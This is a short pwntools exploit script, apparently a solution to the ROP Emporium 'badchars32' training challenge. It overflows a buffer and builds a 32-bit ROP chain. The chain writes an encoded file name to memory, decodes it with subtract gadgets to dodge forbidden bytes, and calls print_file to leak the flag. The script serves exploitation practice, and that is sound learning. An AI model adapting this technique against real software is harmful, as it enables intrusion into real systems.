from pwn import *

context.arch = "i386"
context.log_level = "critical"

printFileGadget = 0x08048538
movGadget = 0x0804854f # esi -> (edi)
popGadget = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
popEbxGadget = 0x0804839d;

subGadget = 0x0804854b

targetAddress = 0x0804a018

badchars = b"xga."

bin = "./badchars32"
p = process(bin)

p.recvuntil("> ")

payload = [
	b"i"*44,

	p32(popGadget),	
	b"flbh",
	p32(targetAddress),
	b"iiii",
	p32(movGadget),	

	p32(popGadget),
	b"/tyt",
	p32(targetAddress + 4),
	b"iiii",
	p32(movGadget),

	p32(popEbxGadget),
	p32(0x01010101),

	p32(popGadget),
	b"iiii",
	b"iiii",
	p32(targetAddress + 2),
	p32(subGadget),

	p32(popGadget),
	b"iiii",
	b"iiii",
	p32(targetAddress + 3),
	p32(subGadget),

	p32(popGadget),
	b"iiii",
	b"iiii",
	p32(targetAddress + 4),
	p32(subGadget),

	p32(popGadget),
	b"iiii",
	b"iiii",
	p32(targetAddress + 6),
	p32(subGadget),

	p32(printFileGadget),
	p32(targetAddress)	
]

payload = b"".join(payload)

for c in badchars:
	if c in payload:
		print("Badchar: " + chr(c))
		exit()

p.sendline(payload)
print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
